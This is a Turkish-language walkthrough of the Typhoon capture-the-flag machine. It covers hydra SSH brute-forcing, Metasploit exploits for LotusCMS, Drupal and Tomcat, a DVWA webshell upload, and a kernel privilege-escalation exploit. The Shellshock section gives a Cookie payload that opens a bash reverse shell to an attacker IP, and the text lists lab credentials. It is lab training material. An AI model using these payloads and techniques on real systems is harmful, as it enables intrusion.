---
layout: default
---
# NMAP Çıktısı

![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/1.png)

ftp'ye baktığımda herhangi bir zafiyet bulamadım. Anonymous olarak giriş yapılabiliyordu fakat faydalı bir şey yoktu.

# SSH 

SSH'a Hydra yardımı ile Brute Force uygulayarak olası bir kullanıcı adı ve parolası bulmaya çalıştım.

```bash
$ hydra -L UserList.txt -P /usr/share/wordlists/rockyou.txt 192.168.44.129 -t 20 -V ssh

```

![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/2.png)

SSH ile güzel bir başlangıç yaptık. Bulduğum bilgilerle giriş yapmayı denedim.

![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/3.PNG)

# HTTP

80 portunda bir Apache server'ı çalıştığını görmüştüm, bir taraftan sayfayı kurcalarken diğer taraftan nikto ve dirb toollarını bilgi toplamaları için çalıştırdım.


```bash
$ dirb http://192.168.44.129 -o dirb

```

![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/4.png)

```bash
$ nikto -host http://192.168.44.129

```

![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/5.png)

Nikto çıktısında merak uyandırıcı birkaç bir şey buldum ve shellshock zafiyetini kurcalamaya karar verdim.

# Shelshock

**Bash, kendisine web uygulaması tarafından yollanan komutları da çalıştırabilmektedir ve shellshock zafiyetinin oluştuğu kısım ise bu özelliğin kötü amaçla kullanılmasıdır.**

/cgi-bin/ klasörü altında bulunan dosya üzerinden bu zafiyet istismar edilebilmektedir. Burp Suite yardımıyla araya girerek isteği yakaladım ve backdoor oluşturacak zararlı kodumu Cookie'ye ekleyerek isteği yolladım.

```bash
Cookie:() { :;}; echo; /bin/bash -i >& /dev/tcp/192.168.44.128/5555 0>&1

```

![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/6.png)

5555 portunu dinlemeye başladım. İstismar başarıyla sonuçladı ve shell'i aldım.

![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/7.png)

# robot.txt ve MongoDB

Web Crawler'ların erişmemesi için robot.txt'ye MongoDB dizini eklendiğini gördüm. Böylece MongoDB dizininden haberim oldu ve dizine gittiğimde bazı yararlı bilgilerle karşılaştım.

robot.txt ---> ![Octocat](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/8.png)

![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/9.png)

ıd:typhoon pw:789456123 bilgileri ile ssh a girilebilir.

# CMS

cms dizinine gittiğimde beni böyle bir ekran karşıladı.

![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/10.png)

LotusCMS hakkında biraz araştırma yaptım ve Exploit Database'de bir RCE zaafiyeti olduğunu gördüm.

![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/11.png)

Metasploit Framework kullanarak zafiyeti istismar etmeye çalıştım.

![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/12.png)

![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/13.png)

ve meterpreter session nı aldım.

# drupal

drupal dizinine gidip sayfanın kaynağını görüntülediğimde drupal ın drupal 8 olduğunu öğrendim.

![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/17.png)

Metasploit Framework de drupal 8 için görünen exploitleri denemeye başladım ve drupal_drupalgeddon2 isimli exploit ile sonuca ulaşabildim.

![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/18.png)

#phpMyAdmin

![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/14.png)

phpMyAdmin dizini beni görseldeki login sayfası ile karşıladı. Burp Suite ile Brute Force yapmayı denedim fakat herhangi bir sonuç alamadım. Bir süre manual olarak ıd pw denedikten sonra ıd:root pw:toor bilgileri ile içeri girebildim. İçerde yok yoktu.

# Calendar

phpMyAdmin içerisinde calendar için kullanılabilecek id pw buldum fakat calendar'a hiçbir şekilde erişemedim.

![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/15.png)

**an0ther_fl4g_br0!**

![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/16.png)

# DVWA

phpMyAdmin içerisinde Dvwa için kullanılan bazı önemli bilgileri buldum.

![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/19.png)

Bulduğum hash'i decrypt etmek için hashcat kullanmaya çalıştım fakat cevap alamadım. Online bir decrypt sayfasını kullanarak parolayı buldum.

![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/20.png)

Daha sonra DVWA ya girerek Security kısmından güvenlik derecesini Impossible'dan Low'a düşürdüm _çünkü neden yapmayayım ki ?_

Vulnerability : File Upload sekmesine geldim ve bir webshell bularak buradan yükleme işlemini gerçekleştirdim.

![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/21.png)

Web shell dosyası içerisinde kendi ip mi ve kendim belirlediğim portu yazdım.

![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/22.png)

Belirlediğim portu dinlemeye başladım ve upload gerçekleştikten sonra shell'i aldım.

![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/23.png)

# Apache Tomcat/Coyote JPS engine 1.1

Metasploit Framework da bulunan tomcat_mgr_login modülü ile 8080 portunda bulunan Tomcat servisinin login bilgilerini almaya çalıştım.

![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/24.PNG)

Bulmuş olduğum tomcat:tomcat bilgisi ile tomcat_mgr_upload modülünü kullanarak meterpreter shell'i elde ettim.

![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/25.png)

# Privilege Escalation

uname -a komutu ile sistem bilgilerini çektim ve biraz araştırma yaptığımda yetki yükseltme zafiyetine sahip olduğunu fark ettim. https://www.exploit-db.com/exploits/37292

![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/26.png)

Bulduğum exploit'i kendi makinemden hedef makineye wget yardımıyla çekerek gcc ile derleyip çalıştırdım.

![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/28.png)

Başarılı bir şekilde root oldum ve /root dizinindeki flag'i okudum.

![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/lastflag.png)


### Teşekkürler, Başka Makinelerde Görüşmek Üzere.



